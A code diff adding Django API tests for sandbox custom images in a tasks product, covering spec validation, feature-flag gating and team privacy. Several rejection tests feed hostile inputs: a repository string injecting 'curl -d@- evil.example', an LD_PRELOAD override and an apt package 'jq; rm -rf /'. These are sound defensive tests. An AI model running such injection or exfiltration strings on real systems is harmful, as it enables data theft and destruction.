@@ -53,6 +53,7 @@ from products.tasks.backend.logic.stream.redis_stream import (
 from products.tasks.backend.models import (
     CodeInvite,
     CodeInviteRedemption,
+    SandboxCustomImage,
     SandboxEnvironment,
     Task,
     TaskAutomation,
@@ -1100,6 +1101,20 @@ class TestTaskAPI(BaseTaskAPITest):
         task = Task.objects.get(id=data["id"])
         self.assertEqual(task.origin_product, Task.OriginProduct.HOGDESK)
 
+    def test_create_task_rejects_internal_image_builder_origin(self):
+        response = self.client.post(
+            "/api/projects/@current/tasks/",
+            {
+                "title": "New Task",
+                "description": "New Description",
+                "origin_product": "image_builder",
+                "repository": "posthog/posthog",
+            },
+            format="json",
+        )
+
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
     def test_create_task_with_github_user_integration(self):
         user_integration = _grant_user_github_access(self.user)
 
@@ -1636,6 +1651,7 @@ class TestTaskAPI(BaseTaskAPITest):
                 "reasoning_effort": "high",
                 "initial_permission_mode": "auto",
                 "run_source": "manual",
+                "auto_publish": True,
             },
             format="json",
         )
@@ -1653,6 +1669,7 @@ class TestTaskAPI(BaseTaskAPITest):
         self.assertEqual(task_run.state["reasoning_effort"], "high")
         self.assertEqual(task_run.state["initial_permission_mode"], "auto")
         self.assertEqual(task_run.state["run_source"], "manual")
+        self.assertEqual(task_run.state["auto_publish"], True)
         mock_workflow.assert_not_called()
 
     @patch("products.tasks.backend.temporal.client.execute_task_processing_workflow")
@@ -3134,7 +3151,7 @@ class TestTaskInternalFilterAPI(BaseTaskAPITest):
 
 class TestTaskSummariesAPI(BaseTaskAPITest):
     SUMMARIES_URL = "/api/projects/@current/tasks/summaries/"
-    SUMMARY_FIELDS = {"id", "title", "repository", "created_at", "updated_at", "latest_run"}
+    SUMMARY_FIELDS = {"id", "title", "repository", "created_at", "updated_at", "origin_product", "latest_run"}
 
     def post_summaries(self, ids):
         return self.client.post(self.SUMMARIES_URL, {"ids": ids}, format="json")
@@ -7943,3 +7960,358 @@ class TestGetPosthogCodeUsage(TestCase):
     def test_fails_open_when_no_gateway_url(self, mock_token):
         self.assertIsNone(get_posthog_code_usage(MagicMock(), 1))
         mock_token.assert_not_called()
+
+
+def _make_custom_image(*, team: Team, user: User, **kwargs) -> SandboxCustomImage:
+    image = SandboxCustomImage(team=team, created_by=user, **kwargs)
+    image.save()
+    return image
+
+
+class TestSandboxCustomImageAPI(BaseTaskAPITest):
+    base_url = "/api/projects/@current/sandbox_custom_images/"
+
+    def setUp(self):
+        super().setUp()
+        self._vm_flag_payload = None
+        payload_patcher = patch(
+            "posthoganalytics.get_feature_flag_payload",
+            side_effect=lambda *args, **kwargs: self._vm_flag_payload,
+        )
+        payload_patcher.start()
+        self.addCleanup(payload_patcher.stop)
+        self.enable_vm_sandbox_flag(True)
+
+    def enable_vm_sandbox_flag(self, enabled):
+        allowed = {"tasks", "tasks-modal-vm-sandbox"} if enabled else {"tasks"}
+        self.mock_feature_flag.side_effect = lambda flag_name, *args, **kwargs: flag_name in allowed
+        self._vm_flag_payload = '{"origin_products": ["user_created"]}' if enabled else None
+
+    def detail_url(self, image_id):
+        return f"{self.base_url}{image_id}/"
+
+    def test_create_spawns_linked_builder_task_with_vm_override(self):
+        response = self.client.post(
+            self.base_url,
+            {"name": "ML tools", "description": "install pytorch and flox"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+        data = response.json()
+        self.assertEqual(data["status"], "draft")
+        self.assertIsNotNone(data["builder_task_id"])
+
+        task = Task.objects.get(id=data["builder_task_id"])
+        run = task.runs.order_by("-created_at").first()
+        assert run is not None
+        state = run.state or {}
+        self.assertEqual(state["custom_image_builder_id"], data["id"])
+        self.assertIs(state["use_modal_vm_sandbox"], True)
+        self.assertIn("image-spec.yaml", state["pending_user_message"])
+        self.assertIn("install pytorch and flox", state["pending_user_message"])
+
+    @parameterized.expand(
+        [
+            ("shell_metachars", 'posthog/x" && curl -d@- evil.example && echo "'),
+            ("missing_repo", "posthog"),
+            ("space", "posthog/my repo"),
+        ]
+    )
+    def test_create_rejects_malformed_repository(self, _name, repository):
+        response = self.client.post(
+            self.base_url,
+            {"name": "img", "repository": repository},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
+    @patch("products.tasks.backend.temporal.client.execute_build_sandbox_image_workflow")
+    def test_build_with_inline_spec_persists_and_triggers_workflow(self, mock_workflow):
+        image = _make_custom_image(team=self.team, user=self.user, name="img")
+        response = self.client.post(
+            self.detail_url(image.id) + "build/",
+            {"spec_yaml": "version: 1\napt_packages: [jq]\n"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response.json()["status"], "scanning")
+        image.refresh_from_db()
+        self.assertEqual(image.spec["apt_packages"], ["jq"])
+        mock_workflow.assert_called_once_with(str(image.id), self.team.id)
+
+    @parameterized.expand(
+        [
+            ("invalid_yaml", "version: [unclosed"),
+            ("not_a_mapping", "- just\n- a\n- list\n"),
+            ("unsupported_version", "version: 2\napt_packages: [jq]\n"),
+            ("blocked_env_key", "version: 1\nenv:\n  LD_PRELOAD: /tmp/evil.so\n"),
+            ("bad_apt_package", "version: 1\napt_packages: ['jq; rm -rf /']\n"),
+            ("empty_spec", "version: 1\n"),
+            ("repo_setup_without_repository", "version: 1\nrepo_setup_commands: ['uv sync']\n"),
+        ]
+    )
+    @patch("products.tasks.backend.temporal.client.execute_build_sandbox_image_workflow")
+    def test_build_rejects_invalid_specs(self, _name, spec_yaml, mock_workflow):
+        image = _make_custom_image(team=self.team, user=self.user, name="img")
+        response = self.client.post(self.detail_url(image.id) + "build/", {"spec_yaml": spec_yaml}, format="json")
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+        mock_workflow.assert_not_called()
+        image.refresh_from_db()
+        self.assertEqual(image.status, SandboxCustomImage.Status.DRAFT)
+
+    @patch("products.tasks.backend.temporal.client.execute_build_sandbox_image_workflow")
+    def test_build_rejected_while_in_progress(self, mock_workflow):
+        image = _make_custom_image(
+            team=self.team, user=self.user, name="img", status=SandboxCustomImage.Status.BUILDING
+        )
+        response = self.client.post(
+            self.detail_url(image.id) + "build/", {"spec_yaml": "version: 1\napt_packages: [jq]\n"}, format="json"
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+        mock_workflow.assert_not_called()
+
+    def test_other_team_image_not_reachable(self):
+        other_org = Organization.objects.create(name="Other Org")
+        other_team = Team.objects.create(organization=other_org, name="Other Team")
+        other_image = _make_custom_image(team=other_team, user=self.user, name="theirs")
+
+        self.assertEqual(self.client.get(self.detail_url(other_image.id)).status_code, status.HTTP_404_NOT_FOUND)
+
+        response = self.client.post(
+            "/api/projects/@current/sandbox_environments/",
+            {"name": "Env", "network_access_level": "full", "custom_image_id": str(other_image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
+    def test_environment_carries_custom_image_fields(self):
+        image = _make_custom_image(
+            team=self.team,
+            user=self.user,
+            name="ready-img",
+            status=SandboxCustomImage.Status.READY,
+            modal_image_name="posthog-sandbox-custom-1-abc:v1",
+        )
+        response = self.client.post(
+            "/api/projects/@current/sandbox_environments/",
+            {"name": "Env", "network_access_level": "full", "custom_image_id": str(image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+        data = response.json()
+        self.assertEqual(data["custom_image_id"], str(image.id))
+        self.assertEqual(data["custom_image_name"], "ready-img")
+        self.assertEqual(data["custom_image_status"], "ready")
+
+        env_id = data["id"]
+        response = self.client.patch(
+            f"/api/projects/@current/sandbox_environments/{env_id}/", {"custom_image_id": None}, format="json"
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertIsNone(response.json()["custom_image_id"])
+
+    def test_delete_image_clears_environment_reference(self):
+        image = _make_custom_image(team=self.team, user=self.user, name="img")
+        env = SandboxEnvironment.objects.create(team=self.team, name="Env", created_by=self.user, custom_image=image)
+
+        response = self.client.delete(self.detail_url(image.id))
+        self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT)
+        env.refresh_from_db()
+        self.assertIsNone(env.custom_image_id)
+
+    def test_endpoints_forbidden_when_vm_flag_disabled(self):
+        image = _make_custom_image(team=self.team, user=self.user, name="img")
+        self.enable_vm_sandbox_flag(False)
+
+        self.assertEqual(self.client.get(self.base_url).status_code, status.HTTP_403_FORBIDDEN)
+        self.assertEqual(
+            self.client.post(self.base_url, {"name": "Blocked"}, format="json").status_code,
+            status.HTTP_403_FORBIDDEN,
+        )
+        self.assertEqual(
+            self.client.post(
+                self.detail_url(image.id) + "build/", {"spec_yaml": "version: 1\napt_packages: [jq]\n"}, format="json"
+            ).status_code,
+            status.HTTP_403_FORBIDDEN,
+        )
+        response = self.client.post(
+            "/api/projects/@current/sandbox_environments/",
+            {"name": "Env", "network_access_level": "full", "custom_image_id": str(image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
+    def test_endpoints_forbidden_without_origin_payload(self):
+        with patch("posthoganalytics.get_feature_flag_payload", return_value=None):
+            self.assertEqual(self.client.get(self.base_url).status_code, status.HTTP_403_FORBIDDEN)
+
+    def test_create_with_repository_seeds_builder(self):
+        response = self.client.post(
+            self.base_url,
+            {"name": "Repo image", "repository": "posthog/hedgebox"},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+        data = response.json()
+        self.assertEqual(data["repository"], "posthog/hedgebox")
+        task = Task.objects.get(id=data["builder_task_id"])
+        self.assertEqual(task.repository, "posthog/hedgebox")
+        self.assertEqual(task.origin_product, Task.OriginProduct.IMAGE_BUILDER)
+        run = task.runs.order_by("-created_at").first()
+        assert run is not None
+        self.assertIn("/tmp/workspace/repos/posthog/hedgebox", run.state["pending_user_message"])
+
+    def test_team_and_user_caps_enforced(self):
+        _make_custom_image(team=self.team, user=self.user, name="existing")
+        with patch("products.tasks.backend.facade.api.MAX_CUSTOM_IMAGES_PER_TEAM", 1):
+            response = self.client.post(self.base_url, {"name": "Over team cap"}, format="json")
+            self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+            self.assertIn("team already has", response.json()["detail"])
+        with patch("products.tasks.backend.facade.api.MAX_CUSTOM_IMAGES_PER_USER", 1):
+            response = self.client.post(self.base_url, {"name": "Over user cap"}, format="json")
+            self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+            self.assertIn("You already have", response.json()["detail"])
+
+    def test_private_image_hidden_from_other_team_members(self):
+        other_user = self.create_organization_user("imageowner")
+        private_image = _make_custom_image(
+            team=self.team,
+            user=other_user,
+            name="their-private",
+            private=True,
+            status=SandboxCustomImage.Status.READY,
+            modal_image_name="posthog-sandbox-custom-x:latest",
+        )
+
+        names = [i["name"] for i in self.client.get(self.base_url).json()["results"]]
+        self.assertNotIn("their-private", names)
+        self.assertEqual(self.client.get(self.detail_url(private_image.id)).status_code, status.HTTP_404_NOT_FOUND)
+
+        response = self.client.post(
+            "/api/projects/@current/sandbox_environments/",
+            {"name": "Env", "network_access_level": "full", "custom_image_id": str(private_image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
+    def test_private_image_visible_to_creator(self):
+        mine = _make_custom_image(team=self.team, user=self.user, name="my-private", private=True)
+        names = [i["name"] for i in self.client.get(self.base_url).json()["results"]]
+        self.assertIn("my-private", names)
+        self.assertEqual(self.client.get(self.detail_url(mine.id)).status_code, status.HTTP_200_OK)
+
+    def test_builder_task_action_reseeds_after_terminal_run(self):
+        create_response = self.client.post(self.base_url, {"name": "Reseed me"}, format="json")
+        image_id = create_response.json()["id"]
+        original_task_id = create_response.json()["builder_task_id"]
+
+        image = SandboxCustomImage.objects.unscoped().get(id=image_id)
+        image.spec = {"version": 1, "apt_packages": ["jq"], "run_commands": [], "env": {}}
+        image.version = 1
+        image.save()
+        TaskRun.objects.filter(task_id=original_task_id).update(status=TaskRun.Status.COMPLETED)
+
+        response = self.client.post(self.detail_url(image_id) + "builder_task/")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        new_task_id = response.json()["builder_task_id"]
+        self.assertNotEqual(new_task_id, original_task_id)
+
+        run = Task.objects.get(id=new_task_id).runs.order_by("-created_at").first()
+        assert run is not None
+        message = run.state["pending_user_message"]
+        self.assertIn("EXISTING SPEC", message)
+        self.assertIn("apt_packages", message)
+
+    def test_builder_task_action_reuses_live_run(self):
+        create_response = self.client.post(self.base_url, {"name": "Keep me"}, format="json")
+        image_id = create_response.json()["id"]
+        original_task_id = create_response.json()["builder_task_id"]
+
+        response = self.client.post(self.detail_url(image_id) + "builder_task/")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response.json()["builder_task_id"], original_task_id)
+
+    @patch("products.tasks.backend.temporal.client.execute_task_processing_workflow")
+    def test_run_endpoint_persists_custom_image_id(self, mock_workflow):
+        task = self.create_task(created_by=self.user)
+        image = _make_custom_image(
+            team=self.team,
+            user=self.user,
+            name="run-img",
+            status=SandboxCustomImage.Status.READY,
+            modal_image_name="posthog-sandbox-custom-y:latest",
+        )
+
+        response = self.client.post(
+            f"/api/projects/@current/tasks/{task.id}/run/",
+            {"custom_image_id": str(image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        run_id = response.json()["latest_run"]["id"]
+        self.assertEqual(TaskRun.objects.get(id=run_id).state["custom_image_id"], str(image.id))
+
+    @parameterized.expand(
+        [
+            ("not_ready", {"status": SandboxCustomImage.Status.DRAFT}),
+            ("other_users_private", {"private": True, "other_owner": True}),
+        ]
+    )
+    @patch("products.tasks.backend.temporal.client.execute_task_processing_workflow")
+    def test_run_endpoint_rejects_unusable_custom_image(self, _name, image_kwargs, mock_workflow):
+        task = self.create_task(created_by=self.user)
+        owner = self.create_organization_user("imgowner") if image_kwargs.pop("other_owner", False) else self.user
+        image = _make_custom_image(team=self.team, user=owner, name="bad-img", **image_kwargs)
+
+        response = self.client.post(
+            f"/api/projects/@current/tasks/{task.id}/run/",
+            {"custom_image_id": str(image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
+
+    def test_bootstrap_run_endpoint_persists_custom_image_id(self):
+        task = self.create_task(created_by=self.user)
+        image = _make_custom_image(
+            team=self.team,
+            user=self.user,
+            name="bootstrap-img",
+            status=SandboxCustomImage.Status.READY,
+            modal_image_name="posthog-sandbox-custom-z:latest",
+        )
+
+        response = self.client.post(
+            f"/api/projects/@current/tasks/{task.id}/runs/",
+            {"environment": "cloud", "custom_image_id": str(image.id)},
+            format="json",
+        )
+        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
+        run_id = response.json()["id"]
+        self.assertEqual(TaskRun.objects.get(id=run_id).state["custom_image_id"], str(image.id))
+
+    def test_build_log_only_in_detail_response(self):
+        image = _make_custom_image(
+            team=self.team, user=self.user, name="logged", build_log="Step 1/3: apt-get install jq"
+        )
+
+        list_item = next(i for i in self.client.get(self.base_url).json()["results"] if i["id"] == str(image.id))
+        self.assertEqual(list_item["build_log"], "")
+
+        detail = self.client.get(self.detail_url(image.id)).json()
+        self.assertEqual(detail["build_log"], "Step 1/3: apt-get install jq")
+
+    @patch("products.tasks.backend.temporal.client.execute_build_sandbox_image_workflow")
+    def test_build_falls_back_to_stored_spec_when_builder_sandbox_gone(self, mock_workflow):
+        create_response = self.client.post(self.base_url, {"name": "Rebuild me"}, format="json")
+        image_id = create_response.json()["id"]
+        image = SandboxCustomImage.objects.unscoped().get(id=image_id)
+        image.spec = {"version": 1, "apt_packages": ["jq"], "run_commands": [], "env": {}}
+        image.status = SandboxCustomImage.Status.READY
+        image.save()
+        assert image.builder_task_id is not None
+        TaskRun.objects.filter(task_id=image.builder_task_id).update(status=TaskRun.Status.COMPLETED)
+
+        response = self.client.post(self.detail_url(image_id) + "build/", {}, format="json")
+        self.assertEqual(response.status_code, status.HTTP_200_OK)
+        self.assertEqual(response.json()["status"], "scanning")
+        mock_workflow.assert_called_once()
